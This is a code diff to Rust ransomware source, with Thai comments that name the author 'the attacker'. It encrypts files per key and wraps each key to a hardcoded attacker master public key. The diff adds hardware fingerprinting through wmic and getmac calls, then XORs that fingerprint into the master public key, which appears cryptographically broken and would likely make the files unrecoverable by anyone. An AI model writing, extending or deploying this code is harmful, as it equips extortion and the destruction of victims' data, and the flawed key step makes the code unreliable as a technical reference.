@@ -4,17 +4,68 @@ use chacha20poly1305::{
 };
 use x25519_dalek::{PublicKey, EphemeralSecret, SharedSecret};
 use rand::{RngCore, rngs::OsRng};
+use sha2::{Sha256, Digest};
 use std::fs::File;
 use std::io::{Read, Write, BufReader, BufWriter};
 use std::path::Path;
+use std::process::Command;
 
-// Master public key ของเรา (attacker) - เปลี่ยนเป็นของจริงตอน compile
-const MASTER_PUBLIC_KEY: [u8; 32] = [
+// Base master public key ของเรา (attacker) - จะถูก modify ด้วย hardware ID
+const BASE_MASTER_PUBLIC_KEY: [u8; 32] = [
     0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef,
     0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef,
     0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef,
     0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef,
 ];
+
+pub fn get_machine_fingerprint() -> [u8; 32] {
+    let mut hasher = Sha256::new();
+
+    // CPU ID
+    if let Ok(output) = Command::new("wmic")
+        .args(&["cpu", "get", "ProcessorId"])
+        .output() {
+        hasher.update(&output.stdout);
+    }
+
+    // MAC Address
+    if let Ok(output) = Command::new("getmac")
+        .args(&["/v", "/fo", "csv"])
+        .output() {
+        hasher.update(&output.stdout);
+    }
+
+    // Disk Serial
+    if let Ok(output) = Command::new("wmic")
+        .args(&["diskdrive", "get", "SerialNumber"])
+        .output() {
+        hasher.update(&output.stdout);
+    }
+
+    // Motherboard Serial
+    if let Ok(output) = Command::new("wmic")
+        .args(&["baseboard", "get", "SerialNumber"])
+        .output() {
+        hasher.update(&output.stdout);
+    }
+
+    let result = hasher.finalize();
+    let mut hash = [0u8; 32];
+    hash.copy_from_slice(&result);
+    hash
+}
+
+fn get_master_public_key() -> [u8; 32] {
+    let mut key = BASE_MASTER_PUBLIC_KEY;
+    let fingerprint = get_machine_fingerprint();
+
+    // XOR base key กับ machine fingerprint
+    for i in 0..32 {
+        key[i] ^= fingerprint[i];
+    }
+
+    key
+}
 
 pub fn encrypt_file(path: &Path) -> std::io::Result<()> {
     // สร้าง symmetric key ใหม่สำหรับไฟล์นี้ (ChaCha20Poly1305)
@@ -25,8 +76,8 @@ pub fn encrypt_file(path: &Path) -> std::io::Result<()> {
     let ephemeral_secret = EphemeralSecret::random_from_rng(OsRng);
     let ephemeral_pub = PublicKey::from(&ephemeral_secret);
 
-    // Derive shared secret กับ master public key
-    let master_pub = PublicKey::from(MASTER_PUBLIC_KEY);
+    // Derive shared secret กับ master public key (machine-specific)
+    let master_pub = PublicKey::from(get_master_public_key());
     let shared: SharedSecret = ephemeral_secret.diffie_hellman(&master_pub);
 
     // ใช้ shared secret เป็น seed สร้าง key จริงสำหรับ encrypt sym_key (simple KDF)
